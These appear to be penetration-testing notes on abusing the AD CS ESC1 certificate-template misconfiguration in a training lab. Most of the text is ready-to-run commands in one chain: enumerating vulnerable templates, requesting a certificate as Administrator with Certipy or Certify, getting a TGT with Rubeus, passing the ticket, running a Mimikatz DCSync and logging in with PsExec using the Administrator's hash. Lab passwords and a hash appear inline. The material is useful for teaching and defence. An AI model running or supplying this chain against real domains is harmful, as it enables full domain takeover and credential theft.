## ESC1
The primary misconfiguration behind this domain escalation scenario lies in the possibility of specifying an alternate user in the certificate request. This means that if a certificate template allows including a `subjectAltName (SAN)` different from the user making the certificate request (CSR), it would allow us to request a certificate as any user in the domain.test

#### ESC1 Abuse Requirements
To abuse ESC1 the following conditions must be met:
* The Enterprise CA grants enrollment rights to low-privileged users.
* Manager approval should be turned off 
* No authorized signatures are required.
* The security descriptor of the certificate template must be excessively permissive, allowing low-privileged users to enroll for certificates.
* The certificate template defines EKUs that enable authentication.
* The certificate template allows requesters to specify a subjectAltName (SAN) in the CSR.

<br>
<br>


## ESC1 from Linux 
#### enumeration    
```bash
certipy find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -vulnerable -stdout
```
#### abusing ESC1
request certificate for Admin user  
```bash
certipy req -u 'BlWasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -ca lab-LAB-DC-CA -template ESC1 -upn Administrator
```
this command creates a file named administrator.pfx we can use that certificate to authenticate as the administrator user (certipy auth) 
```bash
certipy auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip 10.129.205.199
```

We now have a TGT saved in administrator.ccache as well as the NT hash of the Administrator. We can now connect to the DC
```bash 
KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass LAB-DC.LAB.LOCAL
```

<br> 
<br> 

## ESC1 from Windows 
#### enumeration 
```bash
# certify 
.\Certify.exe find /vulnerable

# powershell
Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'
```

#### abusing ESC1
```bash
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC1 /altname:administrator@lab.local
```
we need to use OpenSSL and convert the certificate to pfx format. Copy the cert.pem output from above and save it to linux or use OpenSSL if installed on our windows target host (leave export password empty) 
```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:

& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
now we can authenticate with Rubeus using asktgt 
```bash
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap
```
from here we can use the NT hash with any lateral movement tools or use the TGT base64(ticket.kirbi) to get a session as the Administrator user. One of the different methods we can use is to create a sacrificial logon session using the Rubeus option createnetonly:
```bash
.\Rubeus.exe createnetonly /program:powershell.exe /show
```
this will launch a new powershell session which we will use to PTT 
```bash
.\Rubeus.exe ptt /ticket:doIGQjCCBj6gAwIBBaEDAgEW<SNIP>
```

The powershell process now has the Administrator TGT so we can use the Admin privileges to perform a DCsync attack with Mimikatz 
```bash
PS C:\Tools> Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
PS C:\Tools> Import-Module .\Invoke-Mimikatz.ps1
PS C:\Tools> Invoke-Mimikatz -Command '"lsadump::dcsync /user:lab\Administrator"'
```
with the Administrator hash we can login w/ PsExec 
```bash
impacket-psexec administrator@10.129.221.7 -hashes ':2b576acbe6bcfda7294d6bd18041b8fe'
```


